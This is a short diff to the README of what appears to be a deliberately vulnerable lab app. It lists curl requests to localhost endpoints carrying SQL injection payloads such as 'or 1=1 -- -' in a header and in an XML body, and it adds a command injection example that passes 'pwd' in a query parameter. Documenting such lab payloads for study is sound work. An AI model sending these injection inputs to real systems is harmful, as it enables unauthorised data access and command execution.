@@ -39,3 +39,10 @@ curl http://localhost:8080/vun/sql/example5/api/users -H "X-Filter:michal' or 1=
 curl -X POST http://localhost:8080/vun/sql/example6/api/users -H "Content-Type: application/xml" -d "<filters><filter>michal</filter></filters>"  
 curl -X POST http://localhost:8080/vun/sql/example6/api/users -H "Content-Type: application/xml" -d "<filters><filter>michal' or 1=1 -- -</filter></filters>"
 ```
+
+## CMD Injection
+
+### GET request - cmd in query param
+```bash
+curl http://localhost:8080/vun/cmd/example1/?cmd=pwd
+```
